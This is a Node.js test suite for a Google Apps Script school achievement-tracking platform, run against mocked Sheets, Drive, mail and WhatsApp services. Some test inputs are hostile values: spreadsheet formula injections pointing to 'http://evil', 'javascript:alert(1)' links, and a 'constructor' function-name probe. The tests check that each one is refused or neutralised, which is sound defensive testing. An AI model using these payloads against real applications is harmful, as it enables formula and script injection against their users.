// Runs Parser.gs and Server.gs against simulated Google services and a saved copy of the main file.
// Usage: AP_FIXTURE=/path/to/main.json node test/server.test.js
const fs = require('fs'), path = require('path'), vm = require('vm');
const fixture = process.env.AP_FIXTURE;
if (!fixture || !fs.existsSync(fixture)) { console.log('SKIP: set AP_FIXTURE to a JSON export of the main file'); process.exit(0); }

class Range {
  constructor(sh, r, c, nr, nc) { Object.assign(this, { sh, r, c, nr, nc }); }
  getValues() { const o = []; for (let i = 0; i < this.nr; i++) { const row = []; for (let j = 0; j < this.nc; j++) { const v = (this.sh.data[this.r - 1 + i] || [])[this.c - 1 + j]; row.push(v === undefined || v === null ? '' : v); } o.push(row); } return o; }
  getValue() { return this.getValues()[0][0]; }
  cells() { const o = []; for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) o.push([this.r + i, this.c + j]); return o; }
  canEdit() { return !this.cells().some(([r, c]) => this.sh.isLocked(r, c)); }
  guard() { if (!this.canEdit()) throw new Error('You are trying to edit a protected cell or object.'); }
  getFormulas() { const o = []; for (let i = 0; i < this.nr; i++) { const row = []; for (let j = 0; j < this.nc; j++) row.push(this.sh.formulas[(this.r + i) + ',' + (this.c + j)] || ''); o.push(row); } return o; }
  getDataValidations() { const o = []; for (let i = 0; i < this.nr; i++) { const row = []; for (let j = 0; j < this.nc; j++) { const list = this.sh.rules[(this.r + i) + ',' + (this.c + j)]; row.push(list ? { getCriteriaType: () => 'LIST', getCriteriaValues: () => [list] } : null); } o.push(row); } return o; }
  setValues(vals) { this.guard(); vals.forEach((row, i) => row.forEach((v, j) => this.sh.set(this.r + i, this.c + j, v))); return this; }
  setValue(v) { this.guard(); const list = this.sh.rules[this.r + ',' + this.c]; if (list && v !== '' && !list.includes(v)) throw new Error('The data you entered violates the data validation rules.'); this.sh.set(this.r, this.c, v); return this; }
  setFontWeight() { return this; }
  getDisplayValues() { return this.getValues().map(r => r.map(v => String(v))); }
  setNumberFormat(f) { this.sh.formats.push([this.r, this.c, this.nr, this.nc, f]); return this; }
  clearContent() { this.guard(); for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) { const row = this.sh.data[this.r - 1 + i]; if (row && row.length >= this.c + j) row[this.c - 1 + j] = ''; } return this; }
}
class Sheet {
  constructor(name, data, hidden) { this.name = name; this.data = data || []; this.hidden = !!hidden; this.writes = []; this.formats = []; this.formulas = {}; this.rules = {}; this.locks = []; }
  isLocked(r, c) {
    const inside = k => r >= k.r1 && r <= k.r2 && c >= (k.c1 || 1) && c <= (k.c2 || 999);
    return this.locks.some(k => !k.warn && !k.mine && inside(k)) || (!!this.lockAll && !(this.lockAll.open || []).some(inside));
  }
  getProtections(type) {
    const rng = k => ({ getRow: () => k.r1, getNumRows: () => k.r2 - k.r1 + 1, getColumn: () => k.c1 || 1, getNumColumns: () => (k.c2 || 999) - (k.c1 || 1) + 1 });
    if (type === 'SHEET') return this.lockAll ? [{ isWarningOnly: () => false, canEdit: () => false, getUnprotectedRanges: () => (this.lockAll.open || []).map(rng) }] : [];
    return this.locks.map(k => ({ isWarningOnly: () => !!k.warn, canEdit: () => !!k.mine, getRange: () => rng(k) }));
  }
  set(r, c, v) { while (this.data.length < r) this.data.push([]); const row = this.data[r - 1]; while (row.length < c) row.push(''); this.writes.push([r, c, row[c - 1], v]); row[c - 1] = v; }
  getName() { return this.name; } getSheetId() { return this.gid || 0; } isSheetHidden() { return this.hidden; } hideSheet() { this.hidden = true; return this; } setFrozenRows() {}
  getLastRow() { for (let i = this.data.length; i > 0; i--) if ((this.data[i - 1] || []).some(v => v !== '' && v !== null && v !== undefined)) return i; return 0; }
  getLastColumn() { return this.data.reduce((m, r) => Math.max(m, r.length), 0); }
  getDataRange() { return new Range(this, 1, 1, Math.max(this.getLastRow(), 1), Math.max(this.getLastColumn(), 1)); }
  getRange(r, c, nr, nc) { return new Range(this, r, c, nr || 1, nc || 1); }
  appendRow(arr) { const r = this.getLastRow() + 1; arr.forEach((v, j) => this.set(r, j + 1, v)); return this; }
  clearContents() { this.data = []; return this; }
  getMaxRows() { return 1000; }
  deleteRow(r) { this.data.splice(r - 1, 1); return this; }
}
class Book {
  constructor(name, id) { this.name = name; this.sheets = []; this.id = id || 'C'.repeat(30); this.owner = 'owner@school.test'; this.editors = []; this.viewers = []; }
  getId() { return this.id; } getOwner() { return { getEmail: () => this.owner }; } getEditors() { return this.editors.map(e => ({ getEmail: () => e })); } getViewers() { return this.viewers.map(e => ({ getEmail: () => e })); }
  getName() { return this.name; } getSheets() { return this.sheets; }
  getSheetByName(n) { return this.sheets.find(s => s.name === n) || null; }
  insertSheet(n) { const s = new Sheet(n, []); this.sheets.push(s); return s; }
}
const main = new Book('المنصة الشاملة (test copy)');
for (const [n, v] of Object.entries(JSON.parse(fs.readFileSync(fixture, 'utf8')))) main.sheets.push(new Sheet(n, v.map(r => r.map(x => x === null ? '' : x))));
main.sheets.push(new Sheet('Rosom_STU_Data', [['secret']], true));
const control = new Book('control'), MAIN_ID = 'M'.repeat(30), props = new Map(), cache = new Map();
let who = 'owner@school.test';
const books = {};   // other spreadsheets the installing account can open, by id
const tokenInfo = {}, fetched = [], mails = [], waCalls = [], triggers = [];
let todayIso = '2026-11-15';
// A stand-in for Google Drive: remembers the folders, files and sharing the script asks for.
const signed = buf => Array.from(buf).map(x => x > 127 ? x - 256 : x);
const drive = { items: [], perms: [], calls: [], failWith: 0, n: 0 };
const driveCall = (url, opt) => {
  const reply = (code, obj) => ({ getResponseCode: () => code, getContentText: () => JSON.stringify(obj || {}) });
  drive.calls.push({ url, auth: (opt.headers || {}).Authorization });
  if (drive.failWith) return reply(drive.failWith, { error: { message: 'internal detail that must not reach the page' } });
  if ((opt.headers || {}).Authorization !== 'Bearer script-token') return reply(401);
  const perm = url.match(/\/files\/([^/]+)\/permissions/);
  if (perm) { drive.perms.push(Object.assign({ file: perm[1] }, JSON.parse(opt.payload))); return reply(200, { id: 'perm' }); }
  let meta, media = null, mime = '';
  if (url.includes('/upload/')) {
    const raw = Buffer.from(Array.from(opt.payload).map(x => (x + 256) % 256)), text = raw.toString('latin1'), boundary = '--' + opt.contentType.split('boundary=')[1];
    const parts = text.split(boundary), head = parts[2].indexOf('\r\n\r\n');
    meta = JSON.parse(Buffer.from(parts[1].slice(parts[1].indexOf('\r\n\r\n') + 4).trim(), 'latin1').toString('utf8'));
    mime = parts[2].slice(0, head).split('Content-Type: ')[1].trim();
    media = Buffer.from(parts[2].slice(head + 4, parts[2].lastIndexOf('\r\n')), 'latin1');
  } else meta = JSON.parse(opt.payload);
  if (meta.parents && !drive.items.some(f => f.id === meta.parents[0] && f.folder)) return reply(404);
  const item = { id: 'D' + (++drive.n), name: meta.name, parent: (meta.parents || [])[0] || null, folder: meta.mimeType === 'application/vnd.google-apps.folder', mime, media };
  drive.items.push(item);
  return reply(200, { id: item.id });
};
const ctx = {
  console, JSON, Math, Date, Object, Array, String, Number, Error, isFinite, isNaN, RegExp,
  SpreadsheetApp: { DataValidationCriteria: { VALUE_IN_LIST: 'LIST', VALUE_IN_RANGE: 'RANGE', CHECKBOX: 'BOX' }, ProtectionType: { RANGE: 'RANGE', SHEET: 'SHEET' }, getActive: () => control, openById: id => { if (id === MAIN_ID) return main; if (books[id]) return books[id]; throw new Error('no access'); }, flush() {}, getUi: () => ({}) },
  PropertiesService: { getScriptProperties: () => ({ getProperty: k => props.has(k) ? props.get(k) : null, setProperty: (k, v) => { props.set(k, String(v)); }, deleteProperty: k => { props.delete(k); } }) },
  CacheService: { getScriptCache: () => ({ get: k => cache.has(k) ? cache.get(k) : null, put: (k, v) => { cache.set(k, v); }, remove: k => { cache.delete(k); } }) },
  LockService: { getScriptLock: () => ({ tryLock: () => true, waitLock() {}, releaseLock() {} }) },
  Session: { getActiveUser: () => ({ getEmail: () => who }), getEffectiveUser: () => ({ getEmail: () => 'owner@school.test' }), getScriptTimeZone: () => 'Asia/Riyadh' },
  Utilities: {
    getUuid: () => require('crypto').randomUUID(),
    formatDate: (d, tz, f) => { if (Math.abs(d.getTime() - Date.now()) < 5000 && f === 'yyyy-MM-dd') return todayIso; const iso = d.toISOString(); return f === 'yyyy-MM-dd' ? iso.slice(0, 10) : f === 'HH:mm' ? iso.slice(11, 16) : iso.slice(11, 19).replace(/:/g, ''); }, DigestAlgorithm: { SHA_256: 'sha256' },
    computeDigest: (alg, str) => Array.from(require('crypto').createHash('sha256').update(str, 'utf8').digest()).map(x => x > 127 ? x - 256 : x),
    base64DecodeWebSafe: str => Array.from(Buffer.from(str, 'base64url')), newBlob: x => ({ getDataAsString: () => Buffer.from(x).toString('utf8'), getBytes: () => signed(Buffer.from(x, 'utf8')) }),
    base64Decode: str => signed(Buffer.from(str, 'base64'))
  },
  MailApp: { getRemainingDailyQuota: () => 100, sendEmail: o => { mails.push(o); } },
  UrlFetchApp: { fetch: (url, opt) => { if (url.includes('googleapis.com/drive/') || url.includes('googleapis.com/upload/drive/')) return driveCall(url, opt); if (url.includes('graph.facebook.com')) { waCalls.push({ url, opt }); return { getResponseCode: () => 200, getContentText: () => '{}' }; } fetched.push(url); const tok = decodeURIComponent(url.split('id_token=')[1]); const info = tokenInfo[tok]; return { getResponseCode: () => info ? 200 : 400, getContentText: () => JSON.stringify(info || {}) }; } },
  ContentService: { MimeType: { JSON: 'json' }, createTextOutput: txt => ({ setMimeType() { return this; }, text: txt }) },
  ScriptApp: {
    getOAuthToken: () => 'script-token',
    getProjectTriggers: () => triggers.map(t => ({ getHandlerFunction: () => t.fn })),
    deleteTrigger: tr => { const i = triggers.findIndex(t => t.fn === tr.getHandlerFunction()); if (i > -1) triggers.splice(i, 1); },
    newTrigger: fn => { const t = { fn }, b = { timeBased: () => b, everyHours: h => { t.everyHours = h; return b; }, atHour: h => { t.hour = h; return b; }, nearMinute: m => { t.minute = m; return b; },
      everyDays: d => { t.days = d; return b; }, inTimezone: z => { t.tz = z; return b; }, create: () => { triggers.push(t); } }; return b; }
  },
  HtmlService: {}
};
vm.createContext(ctx);
for (const f of ['Parser.gs', 'Server.gs']) vm.runInContext(fs.readFileSync(path.join(__dirname, '../apps-script', f), 'utf8'), ctx, { filename: f });
const G = n => (...a) => vm.runInContext(n, ctx)(...a);
let pass = 0, failN = 0;
const ok = (c, m) => { if (c) pass++; else { failN++; console.log('  FAIL:', m); } };
const throws = (fn, code, m) => { try { fn(); ok(false, m + ' (no error)'); } catch (e) { ok(String(e.message).startsWith(code + '|'), m + ' (got ' + e.message + ')'); } };
const as = (email, fn) => { who = email; cache.delete('users'); try { return fn(); } finally { who = 'owner@school.test'; } };
const EPI = 'ابتدائي بنين عالمي', MBI = 'متوسط بنين عالمي', EPN = 'ابتدائي بنين أهلي';

G('setup')();
ok(props.get('DOMAIN') === 'school.test' && props.get('WRITEBACK') === 'off', 'setup defaults: domain set, write-back off');
ok(triggers.some(t => t.fn === 'notifyTrigger' && t.hour === 7 && t.minute === 30), 'setup schedules notifications for 7:30');
throws(() => G('api_sync')(), 'SETUP', 'sync refuses before the main file is set');
throws(() => G('api_saveSettings')(JSON.stringify({ mainFile: 'https://docs.google.com/spreadsheets/d/' + 'X'.repeat(30) + '/edit' })), 'SETUP', 'settings refuse a file the owner cannot open');
G('api_saveSettings')(JSON.stringify({ mainFile: 'https://docs.google.com/spreadsheets/d/' + MAIN_ID + '/edit?usp=sharing' }));
let boot = JSON.parse(G('api_sync')());
const cnt = s => boot.programs.filter(p => p.stage === s).length;
ok(cnt(EPN) === 277 && cnt(EPI) === 206 && cnt(MBI) === 194, 'sync counts 277/206/194, got ' + [cnt(EPN), cnt(EPI), cnt(MBI)]);
ok(!JSON.stringify(boot).includes('secret'), 'hidden tabs are never read');
ok(boot.targets.length === 23 && boot.targets.every(t => Object.keys(t.stages).every(s => [EPN, EPI, MBI].includes(s))), 'targets limited to covered stages');

G('api_saveUser')(JSON.stringify({ email: 'teacher@school.test', name: 'Teacher', role: 'teacher', stages: [EPI], aliases: ['وليد يوسف'] }));
G('api_saveUser')(JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'vp', stages: [EPI, MBI] }));
G('api_saveUser')(JSON.stringify({ email: 'principal@school.test', name: 'Principal', role: 'principal', stages: ['*'] }));
throws(() => G('api_saveUser')(JSON.stringify({ email: 'x@gmail.com', name: 'X', role: 'teacher', stages: [EPI] })), 'INPUT', 'users outside the school domain are refused');
throws(() => G('api_saveUser')(JSON.stringify({ email: 'owner@school.test', name: 'O', role: 'teacher', stages: ['*'] })), 'STATE', 'the last owner cannot be demoted');

throws(() => as('stranger@school.test', () => G('api_bootstrap')()), 'NOACCESS', 'account not on the staff list');
throws(() => as('teacher@other.test', () => G('api_bootstrap')()), 'NOACCESS', 'account from another domain');
throws(() => as('', () => G('api_bootstrap')()), 'AUTH', 'no signed-in account');

const tb = as('teacher@school.test', () => JSON.parse(G('api_bootstrap')()));
ok(tb.programs.length === 206 && tb.programs.every(p => p.stage === EPI), 'teacher sees only their stage');
const target = tb.programs.find(p => p.kpi === 'C.Br 1.3' && p.name.includes('مقياس موهبة'));
const other = boot.programs.find(p => p.stage === EPN);
throws(() => as('teacher@school.test', () => G('api_submit')(JSON.stringify({ type: 'report', programKey: other.key }))), 'FORBIDDEN', 'teacher cannot report on another stage');
throws(() => as('teacher@school.test', () => G('api_submit')(JSON.stringify({ type: 'report', programKey: target.key, evidence: 'javascript:alert(1)' }))), 'INPUT', 'non-https evidence link refused');
throws(() => as('teacher@school.test', () => G('api_submit')(JSON.stringify({ type: 'report', programKey: target.key, actual: -4 }))), 'INPUT', 'negative number refused');
throws(() => as('teacher@school.test', () => G('api_review')('x', 'approved', '')), 'FORBIDDEN', 'teacher cannot review');
throws(() => as('teacher@school.test', () => G('api_users')()), 'FORBIDDEN', 'teacher cannot list users');
throws(() => as('teacher@school.test', () => G('api_notifications')()), 'FORBIDDEN', 'teacher cannot open the notifications page');
throws(() => as('teacher@school.test', () => G('api_updateExecution')(target.key, '{"done":true}')), 'FORBIDDEN', 'teacher cannot write execution data');
throws(() => as('teacher@school.test', () => G('api_saveSettings')('{"writeBack":true}')), 'FORBIDDEN', 'teacher cannot change settings');
ok(JSON.parse(as('vp@school.test', () => G('api_audit')(10))).length > 0, 'vice principal is an admin and can read the activity log');

let sub = as('teacher@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: target.key, outcome: 'done', execDate: '2026-11-05', actual: 28, evidence: 'https://drive.google.com/file/d/abc', note: '=HYPERLINK("http://evil","x")' }))));
ok(sub.status === 'pending' && sub.note.startsWith("'="), 'report saved as pending; formula text neutralised');
const sub2 = as('teacher@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: target.key, outcome: 'done', actual: 30, evidence: 'https://drive.google.com/file/d/abc' }))));
ok(sub2.id === sub.id, 'a second report on the same programme replaces the pending one');
ok(as('teacher@school.test', () => JSON.parse(G('api_bootstrap')()).submissions.length) === 1, 'teacher sees their own report');

// write-back off: approval is recorded, nothing written
const sheet = main.getSheetByName(target.sheet); sheet.writes = [];
let rv = as('vp@school.test', () => JSON.parse(G('api_review')(sub.id, 'approved', 'ok')));
ok(rv.submission.status === 'approved' && sheet.writes.length === 0 && /متوقفة/.test(rv.submission.writeback), 'approval with write-back off writes nothing to the main file');
throws(() => as('vp@school.test', () => G('api_review')(sub.id, 'approved', '')), 'STATE', 'a decided report cannot be decided again');
throws(() => as('vp@school.test', () => G('api_updateExecution')(target.key, '{"done":true}')), 'SETUP', 'direct edit refused while write-back is off');

G('api_saveSettings')(JSON.stringify({ writeBack: true }));
sheet.writes = [];
let wb = as('vp@school.test', () => JSON.parse(G('api_updateExecution')(target.key, JSON.stringify({ done: true, evidence: 'https://drive.google.com/file/d/abc' }))));
ok(wb.ok && sheet.writes.length === 2 && sheet.writes.every(w => w[0] === target.row), 'direct edit writes exactly two cells in the programme row');
ok(sheet.data[target.row - 1][target.c.done - 1] === true && sheet.data[target.row - 1][target.c.evidence - 1] === 'https://drive.google.com/file/d/abc', 'done tick and evidence landed in the right columns');
throws(() => as('vp@school.test', () => G('api_updateExecution')(target.key, JSON.stringify({ comment: 'x' }))), 'FORBIDDEN', "vice principal cannot write the principal's comment");
sheet.writes = [];
wb = as('principal@school.test', () => JSON.parse(G('api_updateExecution')(target.key, JSON.stringify({ comment: '+excellent' }))));
ok(wb.ok && sheet.writes.length === 1 && sheet.data[target.row - 1][target.c.comment - 1] === "'+excellent", "principal's comment written and neutralised");

// rows move in the main file (head office inserts two rows above the block)
const blockStart = 972; sheet.data.splice(blockStart - 5, 0, [], []); sheet.writes = [];
wb = as('vp@school.test', () => JSON.parse(G('api_updateExecution')(target.key, JSON.stringify({ done: false }))));
ok(wb.ok && sheet.writes.length === 1 && sheet.writes[0][0] === target.row + 2 && sheet.data[target.row + 1][target.c.done - 1] === false, 'after rows moved, the write follows the programme to its new row');

// a renamed programme is not written to
const t2 = boot.programs.find(p => p.stage === MBI && p.kpi === 'C.Br 2.1');
const sh2 = main.getSheetByName(t2.sheet); sh2.data[t2.row - 1][t2.c.name - 1] = 'برنامج آخر تماماً'; sh2.writes = [];
throws(() => as('vp@school.test', () => G('api_updateExecution')(t2.key, '{"done":true}')), 'MOVED', 'a programme that was renamed in the main file is refused');
ok(sh2.writes.length === 0, 'and nothing was written');
throws(() => as('vp@school.test', () => G('api_updateExecution')(other.key, '{"done":true}')), 'FORBIDDEN', 'vice principal cannot write outside their stages');

// approve with write-back on
const t3 = tb.programs.find(p => p.kpi === 'C.Br 3.3' && !p.done && p.c.actual);
const s3 = as('teacher@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: t3.key, outcome: 'done', actual: 22, evidence: 'https://drive.google.com/x' }))));
const sh3 = main.getSheetByName(t3.sheet); sh3.writes = [];
rv = as('vp@school.test', () => JSON.parse(G('api_review')(s3.id, 'approved', '')));
ok(rv.program && rv.program.done === true && rv.program.actual === 22 && sh3.writes.length === 3 && sh3.writes.every(w => w[0] === t3.row), 'approval writes done, actual and evidence to the programme row only');
const s4 = as('teacher@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'contribution', stage: EPI, kpi: 'C.Br 1.3', title: 'مركز أول', evidence: 'https://x.y/z' }))));
rv = as('vp@school.test', () => JSON.parse(G('api_review')(s4.id, 'returned', 'أرفق الشهادة')));
ok(rv.submission.status === 'returned' && rv.submission.reviewNote === 'أرفق الشهادة', 'contribution returned with a note');

const log = JSON.parse(G('api_audit')(200));
ok(log.some(a => a.action === 'writeback') && log.some(a => a.action === 'denied') && log.some(a => a.action === 'review-approved'), 'activity log records writes, reviews and refused sign-ins');
G('api_saveUser')(JSON.stringify({ email: 'teacher@school.test', name: 'Teacher', role: 'teacher', stages: [EPI], active: false }));
throws(() => as('teacher@school.test', () => G('api_bootstrap')()), 'NOACCESS', 'a suspended user is locked out');

// ---- the website's endpoint: Google sign-in token, session, routing ----
const CLIENT = 'site-client.apps.googleusercontent.com';
const jwt = claims => 'h.' + Buffer.from(JSON.stringify(claims)).toString('base64url') + '.s';
const soon = Math.floor(Date.now() / 1000) + 3000;
const post = body => { who = ''; try { return JSON.parse(G('doPost')({ postData: { contents: JSON.stringify(body) } }).text); } finally { vm.runInContext('REQ.email = ""', ctx); who = 'owner@school.test'; } };
const mint = (email, extra) => { const claims = Object.assign({ aud: CLIENT, exp: soon, email, email_verified: 'true', iss: 'https://accounts.google.com' }, extra || {}); const tk = jwt(claims); tokenInfo[tk] = claims; return tk; };
ok(post({ fn: 'api_bootstrap' }).code === 'AUTH', 'website request without a session is refused');
ok(post({ fn: 'api_bootstrap', session: 'f'.repeat(64) }).code === 'AUTH', 'unknown session is refused');
ok(post({ fn: 'login', idToken: mint('vp@school.test') }).code === 'SETUP', 'sign-in refused until the client ID is set');
props.set('CLIENT_ID', CLIENT);
fetched.length = 0;
ok(post({ fn: 'login', idToken: 'not-a-token' }).code === 'AUTH' && post({ fn: 'login', idToken: jwt({ aud: 'someone-else', exp: soon, email: 'vp@school.test' }) }).code === 'AUTH', 'malformed token and token for another site are refused');
ok(post({ fn: 'login', idToken: jwt({ aud: CLIENT, exp: soon - 9000, email: 'vp@school.test' }) }).code === 'AUTH' && fetched.length === 0, 'expired token refused without asking Google');
ok(post({ fn: 'login', idToken: jwt({ aud: CLIENT, exp: soon, email: 'vp@school.test' }) }).code === 'AUTH', 'token Google does not confirm is refused');
ok(post({ fn: 'login', idToken: mint('vp@school.test', { email_verified: 'false' }) }).code === 'AUTH', 'unverified email refused');
ok(post({ fn: 'login', idToken: mint('stranger@school.test') }).code === 'NOACCESS' && post({ fn: 'login', idToken: mint('vp@gmail.com') }).code === 'NOACCESS', 'valid Google account that is not on the staff list is refused');
const li = post({ fn: 'login', idToken: mint('vp@school.test') });
const sess = li.ok ? JSON.parse(li.data).session : '';
ok(li.ok && /^[0-9a-f]{64}$/.test(sess) && JSON.parse(JSON.parse(li.data).boot).me.email === 'vp@school.test', 'staff member signs in and receives a session');
ok(![...cache.keys()].some(k => k.includes(sess)), 'the session token itself is not stored on the server, only its hash');
const b2 = post({ fn: 'api_bootstrap', args: [], session: sess });
ok(b2.ok && JSON.parse(b2.data).me.role === 'vp' && JSON.parse(b2.data).programs.every(p => [EPI, MBI].includes(p.stage)), 'session carries the right person and their stages');
ok(post({ fn: 'api_saveUser', args: [JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'owner', stages: ['*'] })], session: sess }).code === 'FORBIDDEN', 'role limits apply through the website too');
ok(post({ fn: 'setup', session: sess }).code === 'INPUT' && post({ fn: 'syncNow_', session: sess }).code === 'INPUT' && post({ fn: 'constructor', session: sess }).code === 'INPUT', 'only listed functions can be called');
const boom = post({ fn: 'api_review', args: [{}, 'approved'], session: sess });
ok(boom.ok === false && !/TypeError|at |\.gs/.test(boom.message), 'unexpected errors do not leak internals');
post({ fn: 'logout', session: sess });
ok(post({ fn: 'api_bootstrap', session: sess }).code === 'AUTH', 'sign-out ends the session');

// ---- admins: the Principal and both Vice Principals manage users and settings ----
ok(JSON.parse(as('vp@school.test', () => G('api_users')())).length >= 4, 'vice principal can list users');
as('vp@school.test', () => G('api_saveUser')(JSON.stringify({ email: 'exec@school.test', name: 'Exec', role: 'teacher', stages: [EPI], aliases: ['وليد يوسف'], phone: '+966 50 000 0009', channel: 'both' })));
const execUser = JSON.parse(G('api_users')()).find(x => x.email === 'exec@school.test');
ok(execUser && execUser.phone === '966500000009' && execUser.channel === 'both', 'an admin adds a user with a phone number and a channel');
throws(() => as('vp@school.test', () => G('api_saveUser')(JSON.stringify({ email: 'owner@school.test', name: 'O', role: 'owner', stages: ['*'], active: false }))), 'FORBIDDEN', "an admin cannot change the technical owner's account");
throws(() => as('vp@school.test', () => G('api_saveUser')(JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'owner', stages: ['*'] }))), 'FORBIDDEN', 'an admin cannot make anyone an owner');
throws(() => G('api_saveUser')(JSON.stringify({ email: 'x@school.test', name: 'X', role: 'teacher', stages: [EPI], channel: 'whatsapp' })), 'INPUT', 'WhatsApp channel needs a phone number');
throws(() => G('api_saveUser')(JSON.stringify({ email: 'x@school.test', name: 'X', role: 'teacher', stages: [EPI], phone: '12ab' })), 'INPUT', 'a malformed phone number is refused');
throws(() => as('vp@school.test', () => G('api_saveSettings')(JSON.stringify({ notifyTime: '25:00' }))), 'INPUT', 'an impossible notification time is refused');
const st2 = JSON.parse(as('vp@school.test', () => G('api_saveSettings')(JSON.stringify({ notifyTime: '06:45', siteUrl: 'https://control.example.org/' })))).settings;
ok(st2.notifyTime === '06:45' && st2.siteUrl === 'https://control.example.org/' && props.get('NOTIFY_TIME') === '06:45', 'an admin changes the notification time');
const nTr = triggers.filter(t => t.fn === 'notifyTrigger');
ok(nTr.length === 1 && nTr[0].hour === 6 && nTr[0].minute === 45 && nTr[0].tz === 'Asia/Riyadh' && triggers.filter(t => t.fn === 'syncTrigger').length === 1, 'the daily schedule moves to the new time, with no duplicate schedules');
throws(() => G('api_saveSettings')(JSON.stringify({ siteUrl: 'javascript:alert(1)' })), 'INPUT', 'site address must be https');

// ---- notifications ----
ok(props.get('WEEKLY') === 'on' && props.get('WEEKLY_DAY') === '0', 'setup switches the weekly report on, for Sundays');
props.set('WEEKLY', 'off');          // the weekly report has its own checks further down
todayIso = '2026-11-26';            // three days before the local science and maths competitions start (29 Nov)
G('api_saveUser')(JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'vp', stages: [EPI, MBI], phone: '966500000003', channel: 'whatsapp' }));
let nt = JSON.parse(as('principal@school.test', () => G('api_notifications')()));
const recOf = e => nt.list.find(r => r.email === e);
ok(nt.time === '06:45' && nt.whatsappAuto === false, 'notifications page reports the sending time and that WhatsApp is manual');
const ex = recOf('exec@school.test');
ok(ex && ex.items.some(i => i.kind === 'd3' && i.role === 'exec' && i.name.includes('مسابقات العلوم')) && ex.items.every(i => i.stage === EPI), 'the person carrying out a programme is told 3 days before the start, within their stages only');
ok(ex.text.includes('يبدأ بعد 3 أيام') && ex.text.includes('https://control.example.org/'), 'the ready WhatsApp text lists the items and the site address');
todayIso = '2026-11-28';            // the day before Term 1 week 14 starts
nt = JSON.parse(as('principal@school.test', () => G('api_notifications')()));
const adminItems = nt.list.filter(r => ['vp@school.test', 'principal@school.test'].includes(r.email)).flatMap(r => r.items);
ok(adminItems.length > 0 && adminItems.every(i => i.role === 'admin' && ['d1', 'd0', 'e1', 'o7'].includes(i.kind)), 'admins are told 24 hours before the start, on the start day, 24 hours before the end and a week after it, never 3 days before');
ok(recOf('vp@school.test').items.every(i => [EPI, MBI].includes(i.stage)), 'an admin is only told about their own stages');
ok(!recOf('owner@school.test'), 'the technical owner is not sent admin notifications');
const doneKeys = new Set(JSON.parse(G('api_bootstrap')()).programs.filter(p => p.done).map(p => p.key));
ok(nt.list.every(r => r.items.every(i => !doneKeys.has(i.key))), 'completed programmes are left out');
mails.length = 0;
G('notifyTrigger')();
const first = mails.length;
ok(first === nt.list.length && mails.every(m => m.htmlBody.includes('dir="rtl"') && !/<script/i.test(m.htmlBody)), 'without automatic WhatsApp everyone gets the email, one message each');
ok(mails.find(m => m.to === 'vp@school.test') !== undefined, 'a WhatsApp-only person still gets the email while WhatsApp is not connected');
G('notifyTrigger')();
ok(mails.length === first, 'a second run on the same day sends nothing more');
ok(JSON.parse(as('principal@school.test', () => G('api_notifications')())).list.every(r => /email sent/.test(r.status)), 'the page shows what was sent');
props.set('NOTIFY', 'off'); todayIso = '2026-11-29'; mails.length = 0; G('notifyTrigger')();
ok(mails.length === 0, 'nothing is sent while notifications are switched off');
props.set('NOTIFY', 'on'); props.set('WA_TOKEN', 'x'.repeat(40)); props.set('WA_PHONE_ID', '1234567890'); props.set('WA_TEMPLATE', 'daily_digest');
G('notifyTrigger')();
const vpWa = waCalls.find(c => JSON.parse(c.opt.payload).to === '966500000003');
ok(vpWa && JSON.parse(vpWa.opt.payload).template.name === 'daily_digest' && !/[\n\t]/.test(JSON.parse(vpWa.opt.payload).template.components[0].parameters[1].text) && vpWa.opt.headers.Authorization.startsWith('Bearer '), 'with WhatsApp connected, the message goes through the approved template');
ok(!mails.some(m => m.to === 'vp@school.test') && mails.some(m => m.to === 'principal@school.test'), 'then a WhatsApp-only person gets no email, others still do');
ok(!JSON.stringify(JSON.parse(as('principal@school.test', () => G('api_bootstrap')())).settings).includes('x'.repeat(40)), 'the WhatsApp token never reaches the page');
mails.length = 0;
as('principal@school.test', () => G('api_sendMyNotification')());
ok(mails.length === 1 && mails[0].to === 'principal@school.test', 'an admin can send themselves a test message');
ok(mails[0].name === 'مسار الإنجاز - مدارس الأندلس بالطائف' && mails[0].body.startsWith('مسار الإنجاز - مدارس الأندلس بالطائف') && mails[0].htmlBody.includes('مسار الإنجاز'), 'messages carry the platform name');
// indicator owners: the national-tests indicator is owned by one person and carried out by subject teachers
G('api_saveUser')(JSON.stringify({ email: 'quran@school.test', name: 'Indicator owner', role: 'teacher', stages: [EPI], aliases: ['أحمد رجب'] }));
let ownerSeen = false;
for (let d = new Date('2026-11-29T00:00:00Z'); d < new Date('2027-05-01T00:00:00Z') && !ownerSeen; d.setUTCDate(d.getUTCDate() + 1)) {
  todayIso = d.toISOString().slice(0, 10);
  const r = JSON.parse(as('principal@school.test', () => G('api_notifications')())).list.find(x => x.email === 'quran@school.test');
  ownerSeen = !!r && r.items.some(i => i.role === 'owner');
}
ok(ownerSeen, 'an indicator owner is told about the programmes of their indicator');

// ---- start page text: public, and nothing else is ----
let pub = post({ fn: 'public' });
ok(pub.ok && Object.keys(JSON.parse(pub.data)).sort().join() === 'slogan,welcome' && JSON.parse(pub.data).slogan.length > 10 && JSON.parse(pub.data).welcome === '', 'the start page text is readable before sign-in, and carries only the slogan and the welcome (empty until an admin writes one)');
throws(() => as('exec@school.test', () => G('api_saveSettings')(JSON.stringify({ slogan: 'x' }))), 'FORBIDDEN', 'a teacher cannot change the start page text');
as('vp@school.test', () => G('api_saveSettings')(JSON.stringify({ slogan: 'نتعلم لنرتقي', welcome: '=HYPERLINK("http://evil")' })));
pub = JSON.parse(post({ fn: 'public' }).data);
ok(pub.slogan === 'نتعلم لنرتقي' && pub.welcome.startsWith("'="), 'an admin changes the slogan and welcome; formula text is neutralised');

// ---- pictures ----
const PIC = 'data:image/jpeg;base64,' + Buffer.from('a small picture').toString('base64');
ok(JSON.parse(as('exec@school.test', () => G('api_savePhoto')(PIC))).photo === PIC, 'a member of staff saves their own picture');
ok(JSON.parse(as('exec@school.test', () => G('api_bootstrap')())).me.photo === PIC && JSON.parse(G('api_users')()).find(x => x.email === 'exec@school.test').photo === PIC, 'the picture comes back for its owner and for admins');
